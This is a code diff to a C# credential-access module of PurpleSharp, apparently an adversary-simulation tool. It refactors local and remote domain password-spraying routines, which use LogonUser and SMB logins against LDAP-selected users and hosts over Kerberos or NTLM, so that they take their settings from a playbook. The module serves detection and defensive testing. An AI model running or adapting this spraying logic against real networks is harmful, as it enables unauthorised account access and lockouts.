@@ -1,4 +1,5 @@
-﻿using System;
+﻿using PurpleSharp.Lib;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
@@ -6,59 +7,40 @@ using System.Net;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using TaskScheduler;
 
 namespace PurpleSharp.Simulations
 {
     public class CredAccess
     {
 
-        public static void LocalDomainPasswordSpray(int nuser, int sleep, string password, string log)
+        public static void LocalDomainPasswordSpray(PlaybookTask playbook_task, string password, string log)
         {
 
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
             logger.SimulationHeader("T1110.003");
             logger.TimestampInfo(String.Format("Local Domain Brute Force using the LogonUser Win32 API function"));
-            bool Kerberos = new bool();
+            logger.TimestampInfo(String.Format("Using {0}", playbook_task.protocol));
             try
             {
-                var rand = new Random();
-                //int usertype = rand.Next(1, 7);
-                int usertype = 1;
-                List<User> usertargets = Lib.Targets.GetUserTargets(usertype, nuser, logger) ;
+                List<User> usertargets = Lib.Targets.GetUserTargets(playbook_task, logger) ;
 
-                //int protocol = rand.Next(1, 3);
-                int protocol = 2;
-                switch (protocol)
-                {
-                    case 1:
-                        Kerberos = true;
-                        break;
-
-                    case 2:
-                        Kerberos = false;
-                        break;
-
-                    default:
-                        return;
-                }
-                logger.TimestampInfo(String.Format("Obtained {0} user accounts", usertargets.Count));
-                if (sleep > 0) logger.TimestampInfo(String.Format("Sleeping {0} seconds between attempt", sleep));
+                if (playbook_task.task_sleep > 0) logger.TimestampInfo(String.Format("Sleeping {0} seconds between attempt", playbook_task.task_sleep));
                 String domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
-                if (usertype == 6) domain = ".";
+                if (playbook_task.user_target_type == 6) domain = ".";
 
                 foreach (var user in usertargets)
                 {
-                    if (Kerberos)
+                    if (playbook_task.protocol.ToUpper().Equals("KERBEROS"))
                     {
-
                         CredAccessHelper.LogonUser(user.UserName, domain, password, 2, 0, logger);
-                        if (sleep > 0) Thread.Sleep(sleep * 1000);
+                        if (playbook_task.task_sleep > 0) Thread.Sleep(playbook_task.task_sleep * 1000);
                     }
                     else
                     {
                         CredAccessHelper.LogonUser(user.UserName, domain, password, 2, 2, logger);
-                        if (sleep > 0) Thread.Sleep(sleep * 1000);
+                        if (playbook_task.task_sleep > 0) Thread.Sleep(playbook_task.task_sleep * 1000);
                     }
                 }
                 logger.SimulationFinished();
@@ -70,94 +52,68 @@ namespace PurpleSharp.Simulations
 
         }
 
-        public static void RemotePasswordSpray(int nhost, int nuser, int sleep, string password, string log)
+
+        public static void RemoteDomainPasswordSpray(PlaybookTask playbook_task, string password, string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
-            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            Logger logger = new Lib.Logger(currentPath + log);
             logger.SimulationHeader("T1110.003");
             logger.TimestampInfo(String.Format("Remote Domain Brute Force using the WNetAddConnection2 Win32 API function"));
-            bool Kerberos = new bool();
-            List<Computer> targets = new List<Computer>();
-            List<User> targetusers = new List<User>();
+            bool Kerberos = true;
+            List<Computer> host_targets = new List<Computer>();
+            List<User> user_targets = new List<User>();
             List<Task> tasklist = new List<Task>();
-            string  domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
-            
+            string domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
+
             try
             {
-                var rand = new Random();
-                int usertype = rand.Next(1, 7);
-                usertype = 1;
-                if (usertype == 6) domain = ".";
-                //int protocol = rand.Next(1, 3);
+                if (playbook_task.user_target_type == 99) domain = ".";
                 // Executing a remote authentication with Kerberos will not connect to the remote host, just the DC.
-                int protocol = 2;
+                host_targets = Targets.GetHostTargets(playbook_task, logger);
+                user_targets = Targets.GetUserTargets(playbook_task, logger);
+                if (playbook_task.protocol.ToUpper().Equals("NTLM")) Kerberos = false;
+                if (playbook_task.task_sleep > 0) logger.TimestampInfo(String.Format("Sleeping {0} seconds between attempt", playbook_task.task_sleep));
 
-                logger.TimestampInfo(String.Format("Querying LDAP for random targets..."));
-
-                int computertype = rand.Next(1, 5);
-                targets = Lib.Targets.GetHostTargets(computertype, nhost, logger);
-                logger.TimestampInfo(String.Format("Obtained {0} target computers", targets.Count));
-                targetusers = Lib.Targets.GetUserTargets(usertype, nuser, logger);
-                logger.TimestampInfo(String.Format("Obtained {0} target user accounts", targetusers.Count));
-                
-                switch (protocol)
+                if (playbook_task.host_target_type == 1 || playbook_task.host_target_type == 2)
                 {
-                    case 1:
-                        Kerberos = true;
-                        break;
-
-                    case 2:
-                        //using NTLM
-                        Kerberos = false;
-                        break;
-
-                    default:
-                        return;
-                }
-                if (sleep > 0) logger.TimestampInfo(String.Format("Sleeping {0} seconds between attempt", sleep));
-
-                int type = rand.Next(1, 3);
-                if (type == 1)
-                {
-                    //Remote spray against a random target host
-                    var random = new Random();
-                    int index = random.Next(targets.Count);
-                    logger.TimestampInfo(String.Format("Picking {0} as a target", targets[index].ComputerName));
-                    foreach (User user in targetusers)
+                    //Remote spray against one target host
+                    //Target host either explictly defined in the playbook or randomly picked using LDAP queries
+                    foreach (User user in user_targets)
                     { 
                         User tempuser = user;
-                        int tempindex = index;
-                        if (sleep > 0 && tempindex > 0) Thread.Sleep(sleep * 1000);
-                        
+                        //int tempindex = index;
+                        //if (playbook_task.task_sleep > 0 && tempindex > 0) Thread.Sleep(playbook_task.task_sleep * 1000);
+                        if (playbook_task.task_sleep > 0 ) Thread.Sleep(playbook_task.task_sleep * 1000);
                         tasklist.Add(Task.Factory.StartNew(() =>
                         {
-                            CredAccessHelper.RemoteSmbLogin(targets[tempindex], domain, tempuser.UserName, password, Kerberos, logger);
+                            CredAccessHelper.RemoteSmbLogin(host_targets[0], domain, tempuser.UserName, password, Kerberos, logger);
                         }));
-
                     }
                     Task.WaitAll(tasklist.ToArray());
 
                 }
-                else if (type == 2)
+                
+                else if (playbook_task.host_target_type == 3 || playbook_task.host_target_type == 4)
                 {
                     //Remote spray against several hosts, distributed
+                    //Target hosts either explictly defined in the playbook or randomly picked using LDAP queries
                     int loops;
-                    if (targetusers.Count >= targets.Count) loops = targets.Count;
-                    else loops = targetusers.Count;
+                    if (user_targets.Count >= host_targets.Count) loops = host_targets.Count;
+                    else loops = user_targets.Count;
 
                     for (int i = 0; i < loops; i++)
                     {
                         int temp = i;
-                        if (sleep > 0 && temp > 0) Thread.Sleep(sleep * 1000);
+                        if (playbook_task.task_sleep > 0 && temp > 0) Thread.Sleep(playbook_task.task_sleep * 1000);
                         tasklist.Add(Task.Factory.StartNew(() =>
                         {
-                            CredAccessHelper.RemoteSmbLogin(targets[temp], domain, targetusers[temp].UserName, password, Kerberos, logger);
+                            CredAccessHelper.RemoteSmbLogin(host_targets[temp], domain, user_targets[temp].UserName, password, Kerberos, logger);
 
                         }));
                     }
                     Task.WaitAll(tasklist.ToArray());
-
                 }
+                
                 logger.SimulationFinished();
             }
             catch (Exception ex)
@@ -165,7 +121,7 @@ namespace PurpleSharp.Simulations
                 logger.SimulationFailed(ex);
             }
         }
-
+        
         public static void Kerberoasting(string log, int sleep)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
